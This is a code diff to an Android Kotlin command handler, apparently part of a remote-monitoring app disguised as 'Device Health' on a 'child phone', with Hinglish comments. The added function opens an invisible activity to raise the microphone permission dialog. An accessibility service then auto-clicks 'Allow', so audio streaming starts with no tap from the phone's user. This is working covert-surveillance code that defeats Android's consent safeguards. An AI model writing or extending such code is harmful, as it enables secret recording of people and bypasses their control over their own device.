@@ -302,17 +302,62 @@ object CommandHandler {
      *  system AudioRecord ko chupchap SILENCE kar deta hai ("mic ni kaam karra").
      *  ForegroundPokeActivity 250 ms ke liye invisible foreground ban kar type
      *  upgrade karti hai; poke fail ho (background launch blocked) to service-level
-     *  upgrade best-effort — wo tab kaam karta hai jab service foreground-start hui thi. */
+     *  upgrade best-effort — wo tab kaam karta hai jab service foreground-start hui thi.
+     *  RECORD_AUDIO runtime permission bhi missing ho to poke-activity "micperm"
+     *  mode me permission dialog khol deti hai aur accessibility khud "Allow"
+     *  click kar deti hai — bina kisi tap ke mic heal (pehle yahin "Fail hua:
+     *  unknown" aata tha). */
     private suspend fun startMicWithInUseGrant(ctx: Context): Pair<Boolean, JsonObject> {
         if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-            val d = JsonObject()
-            d.addProperty("error", "mic permission nahi hai — setup me mic allow karo")
-            return Pair(false, d)
+            val healed = awaitMicPermissionViaPoke(ctx)
+            if (!healed) {
+                val d = JsonObject()
+                d.addProperty(
+                    "error",
+                    "Mic permission nahi mili — child phone par Device Health app ek baar khol kar mic allow karo"
+                )
+                return Pair(false, d)
+            }
         }
         if (Build.VERSION.SDK_INT >= 30) {
             awaitPokeUpgrade(ctx, "mic")
         }
         return AudioStreamer.start(ctx)
+    }
+
+    /** Mic permission self-heal: invisible poke activity khulti hai, system
+     *  permission dialog par accessibility "Allow" click karta hai. Max 12 s
+     *  wait (dialog render + a11y click me thoda time lagta hai). */
+    private suspend fun awaitMicPermissionViaPoke(ctx: Context): Boolean {
+        val before = Store.pokeMicPermAt
+        // a11y auto-grant ARM — sirf "Allow"/"While using the app" par click hoga
+        Store.autoClickStep = "mic"
+        Store.autoClickUntil = android.os.SystemClock.elapsedRealtime() + 30_000L
+        try {
+            ctx.startActivity(
+                Intent(ctx, ForegroundPokeActivity::class.java)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                    .putExtra("mode", "micperm")
+            )
+        } catch (_: Exception) {
+            // background launch blocked — runtime permission background se
+            // request karna possible nahi, honest fail
+            Store.autoClickStep = ""
+            Store.autoClickUntil = 0L
+            return false
+        }
+        val deadline = android.os.SystemClock.elapsedRealtime() + 12_000
+        while (android.os.SystemClock.elapsedRealtime() < deadline &&
+            Store.pokeMicPermAt == before
+        ) {
+            delay(100)
+        }
+        val granted = ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+        if (!granted) {
+            Store.autoClickStep = ""
+            Store.autoClickUntil = 0L
+        }
+        return granted
     }
 
     /** Invisible poke activity launch karo aur uske type-upgrade ka intezaar karo
